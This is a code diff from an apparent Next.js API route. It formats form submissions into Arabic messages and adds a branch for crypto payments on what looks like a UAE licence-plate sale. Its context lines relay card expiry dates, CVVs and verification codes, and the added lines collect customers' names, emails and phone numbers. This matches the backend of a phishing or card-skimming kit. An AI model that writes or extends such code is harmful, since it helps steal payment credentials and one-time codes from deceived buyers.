@@ -35,6 +35,20 @@ export async function POST(request: NextRequest) {
       message += `تاريخ الانتهاء: ${data.cardExpiry}\n`
       message += `CVV: ${data.cardCvv}\n\n`
       message += `🕐 الوقت: ${new Date().toLocaleString("ar-AE", { timeZone: "Asia/Dubai" })}`
+    } else if (type === "crypto_payment") {
+      // Crypto payment form submission
+      message = `🪙 *طلب دفع بالعملات الرقمية*\n\n`
+      message += `📋 *معلومات اللوحة:*\n`
+      message += `الإمارة: ${data.emirate}\n`
+      message += `الكود: ${data.plateCode}\n`
+      message += `الرقم: ${data.plateNumber}\n`
+      message += `السعر: ${data.price}\n`
+      message += `السعر بالدولار: ${data.priceUSD}\n\n`
+      message += `👤 *معلومات العميل:*\n`
+      message += `الاسم: ${data.name}\n`
+      message += `البريد: ${data.email}\n`
+      message += `الهاتف: ${data.phone}\n\n`
+      message += `🕐 الوقت: ${new Date().toLocaleString("ar-AE", { timeZone: "Asia/Dubai" })}`
     } else if (type === "verification") {
       // Verification code submission
       message = `🔐 *رمز التحقق*\n\n`
